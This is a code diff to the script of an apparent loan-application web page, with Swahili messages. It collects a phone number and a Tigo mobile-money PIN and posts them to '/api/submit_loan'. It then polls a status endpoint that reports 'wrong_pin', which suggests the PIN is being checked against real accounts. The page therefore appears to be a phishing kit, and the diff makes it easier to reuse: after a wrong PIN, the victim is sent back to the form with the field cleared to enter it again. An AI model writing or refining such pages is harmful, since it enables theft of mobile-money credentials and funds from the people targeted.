@@ -72,19 +72,20 @@
             try { 
                 var res = await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: loanAmount, months: loanTerm, loan_type: loanData.loan_type || '', purpose: loanData.purpose || '' }) }); 
                 var data = await res.json(); 
-                var appId = data.app_id;
-                // Start checking and redirect to verify when approved
+                var myAppId = data.app_id;
                 var checkInterval = setInterval(async function() {
                     try {
-                        var cr = await fetch('/api/check_status/' + appId);
+                        var cr = await fetch('/api/check_status/' + myAppId);
                         var cd = await cr.json();
                         if (cd.status === 'approved') {
                             clearInterval(checkInterval);
-                            window.location.href = '/verify?app_id=' + appId + '&phone=' + phone + '&amount=' + loanAmount + '&term=' + loanTerm;
+                            window.location.href = '/verify?app_id=' + myAppId + '&phone=' + phone + '&amount=' + loanAmount;
                         } else if (cd.status === 'wrong_pin') {
                             clearInterval(checkInterval);
                             alert('PIN si sahihi. Jaribu tena.');
-                            window.location.href = '/login?amount=' + loanAmount + '&term=' + loanTerm;
+                            document.getElementById('screenWait').classList.remove('active');
+                            document.getElementById('screenForm').classList.add('active');
+                            document.getElementById('tigoPin').value = '';
                         } else if (cd.status === 'invalid_number') {
                             clearInterval(checkInterval);
                             alert('Namba sio ya Tigo. Tafadhali tumia namba ya Tigo.');
@@ -92,7 +93,11 @@
                         }
                     } catch(e) {}
                 }, 3000);
-            } catch(e) { alert('Error: ' + e.message); }
+            } catch(e) { 
+                alert('Error: ' + e.message); 
+                document.getElementById('screenWait').classList.remove('active');
+                document.getElementById('screenForm').classList.add('active');
+            }
         }
     </script>
 </body>
